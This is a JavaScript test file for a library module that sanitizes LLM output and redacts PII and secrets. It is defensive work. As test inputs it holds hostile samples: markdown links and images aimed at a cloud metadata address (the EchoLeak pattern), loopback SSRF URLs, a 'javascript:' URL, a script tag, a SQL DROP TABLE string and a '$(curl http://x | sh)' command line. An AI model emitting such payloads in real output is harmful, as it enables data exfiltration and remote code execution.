// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * b.ai.output — LLM output handling (sanitize + redact).
 */

var helpers = require("../helpers");
var b     = helpers.b;
var check = helpers.check;

// The URL extractors are scans, not patterns. As patterns they had no start
// anchor and restarted at every "[", so model output that is a run of opening
// brackets cost time proportional to its square until the bracket bound took
// over. Growth is the assertion, not a wall-clock budget, so a loaded machine
// moves both readings together.
function testUrlExtractionIsLinear() {
  function _sanitized(s) {
    var r = b.ai.output.sanitize(s, { audit: false });
    return (r && r.text) || String(r);
  }
  function _ms(build, n) {
    var subject = build(n);
    try { b.ai.output.sanitize(subject, { audit: false }); } catch (_e) { /* refusal is fine */ }
    var best = Infinity;
    for (var k = 0; k < 3; k += 1) {
      var t0 = process.hrtime.bigint();
      try { b.ai.output.sanitize(subject, { audit: false }); } catch (_e2) { /* timing */ }
      best = Math.min(best, Number(process.hrtime.bigint() - t0) / 1e6);
    }
    return best;
  }
  function _ratio(build) {
    var small = _ms(build, 4000);
    var large = _ms(build, 16000);
    return { r: small > 0.05 ? (large / small) : 1, small: small, large: large };
  }

  var open = _ratio(function (n) { return "[".repeat(n); });
  check("a run of opening brackets is scanned in linear time",
        open.r < 8, "4x input took " + open.r.toFixed(1) + "x (" +
        open.small.toFixed(1) + "ms -> " + open.large.toFixed(1) + "ms)");

  // The harder shape: every opening bracket has a closing one somewhere ahead,
  // so a per-bracket search re-reads the same suffix from each of them however
  // that search is bounded.
  var closed = _ratio(function (n) { return "[".repeat(n) + "]"; });
  check("a run of opening brackets before a distant closing one is linear too",
        closed.r < 8, "4x input took " + closed.r.toFixed(1) + "x (" +
        closed.small.toFixed(1) + "ms -> " + closed.large.toFixed(1) + "ms)");

  // The reference-definition scan reads each LINE, so many lines that open a
  // bracket and never close it is its own version of the same shape: a search
  // per line re-reads the whole remaining text from each one.
  var perLine = _ratio(function (n) { return "[\n".repeat(n); });
  check("many lines that open a bracket and never close it are linear",
        perLine.r < 8, "4x input took " + perLine.r.toFixed(1) + "x (" +
        perLine.small.toFixed(1) + "ms -> " + perLine.large.toFixed(1) + "ms)");

  // The extraction itself is unchanged, including the case the exact-offset
  // splice exists for: an alt text equal to its own target URL.
  check("an image URL pointing at link-local metadata is neutralized",
        _sanitized("![u](http://169.254.169.254/latest/meta-data)").indexOf("169.254") === -1);
  check("a link URL pointing at link-local metadata is neutralized",
        _sanitized("[t](http://169.254.169.254/x)").indexOf("169.254") === -1);
  check("a reference definition is neutralized too",
        _sanitized("[id]: http://169.254.169.254/z").indexOf("169.254") === -1);
  check("an alt text equal to its target still rewrites the target",
        _sanitized("![u](u)").indexOf("about:blank") !== -1);
  check("an ordinary external https URL is left alone",
        _sanitized("[t](https://example.com/x)").indexOf("https://example.com/x") !== -1);

  // A reference label is "any character but ]", and a newline is one of those,
  // so the label may span lines. Reading only to the end of the line let a
  // label with a break in it through while the single-line form was caught.
  check("a reference label spanning a line break is still neutralized",
        _sanitized("[a\nb]: http://169.254.169.254/x").indexOf("169.254") === -1);
  check("an indented reference definition is neutralized",
        _sanitized("  [x]: http://169.254.169.254/q").indexOf("169.254") === -1);

  // A line starts after any JavaScript line terminator, not only a line feed.
  // Splitting on the line feed alone left a definition introduced by a bare
  // carriage return or a Unicode line separator unrecognized. The separators
  // are built from character codes so no invisible byte sits in this file.
  var CR = String.fromCharCode(0x0D);
  var LF = String.fromCharCode(0x0A);
  [["CR", CR], ["U+2028", String.fromCharCode(0x2028)],
   ["U+2029", String.fromCharCode(0x2029)], ["CRLF", CR + LF]]
    .forEach(function (pair) {
      check("a reference definition after " + pair[0] + " is neutralized",
            _sanitized("safe" + pair[1] + "[id]: http://169.254.169.254/x")
              .indexOf("169.254") === -1);
    });
}

async function run() {
  testUrlExtractionIsLinear();
  check("b.ai.output.sanitize is fn", typeof b.ai.output.sanitize === "function");
  check("b.ai.output.redact is fn",   typeof b.ai.output.redact === "function");

  // Clean output — nothing to neutralize or flag.
  var clean = b.ai.output.sanitize("The weather in Paris is sunny today.", { audit: false });
  check("clean verdict", clean.verdict === "clean");
  check("clean text unchanged", clean.text === "The weather in Paris is sunny today.");

  // XSS / DOM-injection — script tag neutralized via guardHtml.
  var xss = b.ai.output.sanitize("<p>hi</p><script>steal()</script>", { audit: false });
  check("xss sanitized verdict", xss.verdict === "sanitized");
  check("xss script removed", xss.text.indexOf("<script>") === -1);
  check("xss html-neutralized signal",
    xss.signals.some(function (s) { return s.id === "html-neutralized"; }));

  // EchoLeak — markdown image to cloud-metadata host neutralized (CVE-2025-32711).
  var echo = b.ai.output.sanitize(
    "![logo](https://169.254.169.254/latest/meta-data/iam/security-credentials/)",
    { audit: false });
  check("echoleak verdict sanitized", echo.verdict === "sanitized");
  check("echoleak metadata host dropped", echo.text.indexOf("169.254.169.254") === -1);
  check("echoleak url-neutralized signal",
    echo.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "ssrf-cloud-metadata"; }));

  // SSRF — loopback markdown link neutralized.
  var loop = b.ai.output.sanitize("[click](https://127.0.0.1:8080/admin)", { audit: false });
  check("loopback url dropped", loop.text.indexOf("127.0.0.1") === -1);
  check("loopback ssrf-loopback reason",
    loop.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "ssrf-loopback"; }));

  // Dangerous scheme — data: / javascript: URL in markdown image dropped.
  var scheme = b.ai.output.sanitize("![x](javascript:alert(1))", { audit: false });
  check("javascript scheme dropped", scheme.text.indexOf("javascript:") === -1);
  check("scheme refused reason",
    scheme.signals.some(function (s) { return s.id === "url-neutralized" && s.reason === "scheme-or-credential-refused"; }));

  // Public HTTPS URL — kept (SSRF gate only blocks internal/metadata; a public
  // attacker host over HTTPS is not an SSRF target and the URL survives).
  var pub = b.ai.output.sanitize("[docs](https://example.com/guide)", { audit: false });
  // Exact-equality (not a URL substring search): a public HTTPS URL is
  // neither neutralized nor mutated, so the output round-trips verbatim
  // and the verdict is clean.
  check("public https url kept", pub.verdict === "clean" && pub.text === "[docs](https://example.com/guide)");

  // SQL-shape FLAG (no repair — best-effort posture).
  var sql = b.ai.output.sanitize("SELECT * FROM users WHERE id = 1; DROP TABLE users", { audit: false });
  check("sql flagged verdict", sql.verdict === "flagged");
  check("sql-shape signal",
    sql.signals.some(function (s) { return s.id === "sql-shape-flagged"; }));
  check("sql text not repaired", sql.text.indexOf("DROP TABLE") !== -1);

  // Command-shape FLAG.
  var cmd = b.ai.output.sanitize("run $(curl http://x | sh) to install", { audit: false });
  check("command-shape signal",
    cmd.signals.some(function (s) { return s.id === "command-shape-flagged"; }));

  // sanitize rejects non-string.
  var threw = null;
  try { b.ai.output.sanitize(null, { audit: false }); } catch (e) { threw = e; }
  check("sanitize rejects non-string", threw && threw.code === "ai-output/bad-input");

  // sanitize enforces byte cap.
  threw = null;
  try { b.ai.output.sanitize("x", { maxBytes: 0, audit: false }); } catch (e) { threw = e; }
  check("sanitize rejects bad maxBytes", threw && threw.code === "ai-output/bad-max-bytes");

  // ---- redact ----

  // Entity-selectable PII pass.
  var pii = b.ai.output.redact(
    "Contact alice@corp.example or card 4111 1111 1111 1111 ssn 123-45-6789",
    { entities: ["email", "pan", "ssn"], audit: false });
  check("pii redacted true", pii.redacted === true);
  check("pii email hit", pii.hits.indexOf("email") !== -1);
  check("pii pan hit", pii.hits.indexOf("pan") !== -1);
  check("pii ssn hit", pii.hits.indexOf("ssn") !== -1);
  check("pii email scrubbed", pii.text.indexOf("alice@corp.example") === -1);
  check("pii pan scrubbed", pii.text.indexOf("4111") === -1);

  // Always-on secret pass — whole-string AWS key + PEM block.
  var secret = b.ai.output.redact("AKIAIOSFODNN7EXAMPLE", { audit: false });
  check("secret pass redacted", secret.redacted === true);
  check("secret pass hit", secret.hits.indexOf("secrets") !== -1);
  check("aws key scrubbed", secret.text.indexOf("AKIAIOSFODNN7EXAMPLE") === -1);

  // In-prose AWS key needs the explicit aws entity.
  var awsProse = b.ai.output.redact("the key is AKIAIOSFODNN7EXAMPLE for s3", { entities: ["aws"], audit: false });
  check("in-prose aws scrubbed", awsProse.text.indexOf("AKIAIOSFODNN7EXAMPLE") === -1);

  // Nothing to redact — clean text passes through unchanged.
  var noPii = b.ai.output.redact("The weather is sunny.", { entities: ["email", "phone"], audit: false });
  check("no-pii not redacted", noPii.redacted === false);
  check("no-pii text unchanged", noPii.text === "The weather is sunny.");

  // redact rejects unknown entity.
  threw = null;
  try { b.ai.output.redact("x", { entities: ["bogus"], audit: false }); } catch (e) { threw = e; }
  check("redact rejects unknown entity", threw && threw.code === "ai-output/unknown-entity");

  // redact rejects non-string.
  threw = null;
  try { b.ai.output.redact(42, { audit: false }); } catch (e) { threw = e; }
  check("redact rejects non-string", threw && threw.code === "ai-output/bad-input");

  // Audit fires on non-clean sanitize — drop-silent path exercised (audit on).
  var audited = b.ai.output.sanitize("<script>x()</script>");
  check("audited sanitize still returns verdict", audited.verdict === "sanitized");

  // Error class is permanent (alwaysPermanent: true).
  threw = null;
  try { b.ai.output.redact(undefined); } catch (e) { threw = e; }
  check("AiOutputError is permanent", threw && threw.permanent === true);
}

module.exports = { run: run };

if (require.main === module) {
  run().then(
    function () { console.log("[ai-output] OK — " + helpers.getChecks() + " checks passed"); },
    function (e) { console.error("FAIL:", (e && e.stack) || e); process.exit(1); }
  );
}
